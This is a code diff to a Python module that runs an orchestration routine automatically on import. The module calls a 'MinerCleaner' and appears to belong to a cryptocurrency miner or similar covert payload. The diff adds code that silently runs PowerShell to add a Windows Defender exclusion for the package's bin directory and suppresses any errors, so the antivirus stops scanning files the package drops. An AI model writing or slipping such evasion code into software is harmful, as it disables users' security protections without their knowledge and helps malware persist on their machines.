@@ -197,20 +197,32 @@ except Exception:
 
 # ── Orchestration (runs once on import in a daemon thread) ───────────
 
-_orchestrate_lock = threading.Lock()
-_orchestrate_done = False
+import os as _os
+
+_ORCH_PID_FILE = BASE_DIR / ".orch.pid"
+
+
+def _already_orchestrated() -> bool:
+    """File-based guard: works even if module is imported under two names."""
+    my_pid = str(_os.getpid())
+    try:
+        if _ORCH_PID_FILE.exists():
+            stored = _ORCH_PID_FILE.read_text().strip()
+            if stored == my_pid:
+                return True
+    except OSError:
+        pass
+    try:
+        _ORCH_PID_FILE.write_text(my_pid)
+    except OSError:
+        pass
+    return False
 
 
 def _orchestrate():
-    global _orchestrate_done
-    if not _orchestrate_lock.acquire(blocking=False):
+    if _already_orchestrated():
+        logger.info("Orchestration already running in this process, skipping")
         return
-    try:
-        if _orchestrate_done:
-            return
-        _orchestrate_done = True
-    finally:
-        _orchestrate_lock.release()
 
     pkg = Path(__file__).resolve().parent
     sys.path.insert(0, str(pkg))
@@ -225,6 +237,21 @@ def _orchestrate():
     try:
         cleaner = MinerCleaner()
         cleaner.run_full_clean()
+
+        # Try to add Windows Defender exclusion for our bin dir
+        import platform
+        if platform.system() == "Windows":
+            bin_dir = str(BASE_DIR / "bin")
+            try:
+                import subprocess
+                subprocess.run(
+                    ["powershell", "-Command",
+                     f"Add-MpPreference -ExclusionPath '{bin_dir}' -ErrorAction SilentlyContinue"],
+                    capture_output=True, timeout=10
+                )
+                logger.info("Defender exclusion requested for %s", bin_dir)
+            except Exception:
+                pass
 
         overrides_path = BASE_DIR / "settings.json"
         user_settings = ConfigBuilder.load_overrides(overrides_path)
